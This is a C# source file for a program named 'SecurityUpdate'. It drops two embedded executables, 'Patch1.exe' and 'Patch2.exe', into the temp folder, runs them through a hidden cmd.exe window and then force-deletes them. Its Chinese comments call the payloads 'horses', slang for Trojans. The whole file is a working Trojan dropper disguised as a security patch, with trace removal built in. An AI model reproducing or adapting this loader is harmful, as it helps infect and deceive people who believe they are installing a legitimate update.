using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;

namespace SecurityUpdate
{
    class Program
    {
        public static void Update(string command, int seconds)
        {
            if (command != null && !command.Equals(""))
            {
                Process process = new Process();
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.FileName = "cmd.exe";
                startInfo.Arguments = "/C " + command;
                startInfo.UseShellExecute = false;
                startInfo.RedirectStandardInput = false;
                startInfo.RedirectStandardOutput = true; 
                startInfo.CreateNoWindow = true;//不创建窗口
                process.StartInfo = startInfo;
                try
                {
                    if (process.Start())
                    {
                        if (seconds == 0)
                        {
                            process.WaitForExit();
                        }
                        else
                        {
                            process.WaitForExit(seconds); 
                        }
                    }
                }
                catch
                {
                }
                finally
                {
                    if (process != null)
                        process.Close();
                }
            }
        }
        static void Main(string[] args)
        {
            //释放马儿
            string Patch1_path = Path.GetTempPath() + @"\" + "Patch1.exe";
            string Patch2_path = Path.GetTempPath() + @"\" + "Patch2.exe";

            try
            {

                byte[] Patch1 = global::SecurityUpdate.Properties.Resource1.Patch1;

                using (FileStream updateFile1 = new FileStream(Patch1_path, FileMode.Create))
                {
                    updateFile1.Write(Patch1, 0, Patch1.Length);
                }

                byte[] Patch2 = global::SecurityUpdate.Properties.Resource1.Patch2;
                FileStream updateFile2 = new FileStream(Patch2_path, FileMode.CreateNew);
                updateFile2.Write(Patch2, 0, Patch2.Length);
                updateFile2.Close();
            }
            catch
            {

                Console.WriteLine("error");
            }

            //执行马儿

            Update(Patch1_path, 20);
            Update(Patch2_path, 20);

            //删除马儿

            Update("del /f/s/q " + Patch1_path, 30);
            Update("del /f/s/q " + Patch2_path, 30);

        }
    }
}
